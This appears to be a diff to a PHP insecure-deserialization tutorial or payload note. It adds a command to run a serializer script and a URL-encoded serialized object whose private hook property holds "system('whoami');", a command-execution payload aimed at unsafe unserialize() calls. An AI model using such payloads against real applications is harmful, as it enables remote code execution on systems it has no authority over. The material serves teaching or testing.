@@ -48,13 +48,20 @@ class Example2
    private $hook = "system('whoami');";
 }
 
-print(urlencode(serialize(new Example2)) . "\n");
+print(urlencode(serialize(new Example2)) . "\n\n");
 print((serialize(new Example2)) . "\n");
 
 ?>
 ```
+Run:
+```sh
+php serialize.php
+```
+
 Payload:
 ```sh
+O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D
+
 O:8:"Example2":1:{s:14:"Example2hook";s:17:"system('whoami');";} 
 ```
 #####
